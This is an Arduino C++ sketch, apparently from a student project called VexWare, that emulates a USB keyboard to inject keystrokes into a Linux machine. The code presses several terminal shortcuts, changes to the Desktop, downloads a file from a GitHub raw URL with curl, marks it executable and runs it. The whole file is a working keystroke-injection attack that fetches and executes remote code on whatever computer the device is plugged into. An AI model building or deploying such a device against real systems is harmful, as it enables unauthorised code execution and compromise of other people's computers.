/* 
TODOs:
- retest with new terminal shortcut attempts

Linux injection sequence

Uses an Arduino R4 to emulate an HID keyboard and inject keystroke commands to open a terminal, download a file from Github, 
and run the file on the target Linux system.

The general overview of the keystroke sequence is shown below:
- Open terminal
- Change directory
- Download specified file
- Run specified file

Inputs:
download_url: A string containing the URL to a specified file off of GitHub.
file_name: A string containing the name of the downloaded file to run.
*/

#include <Keyboard.h>

int hasRun = 0; // boolean value to run sequence once

String download_url = "https://raw.githubusercontent.com/olincollege/VexWare/master/src/test";
String file_name = "test";

void setup() {
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {
  // Add delay to allow target system to recognize Arduino as keyboard
  delay(800);

  // loop will only run if D2 is pulled low to prevent accidental keystroke injections
  if (digitalRead(2) == LOW) {
    if (hasRun == 0) {
    // Begin keystroke sequence
    // Try opening Linux terminal with several popular shortcuts.
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    Keyboard.releaseAll();
    delay(500); // let animation play

    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play  

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('t');
    Keyboard.releaseAll();
    delay(500); // let animation play 

    // Change file directory
    Keyboard.print("cd ~/Desktop");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    // Download file off of GitHub
    Keyboard.print("curl -O " + download_url);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play, let file download

    // Make file an executable and run downloaded file
    Keyboard.print("chmod +x " + file_name);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    Keyboard.print("./" + file_name);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    hasRun = 1;
    }
  }
}
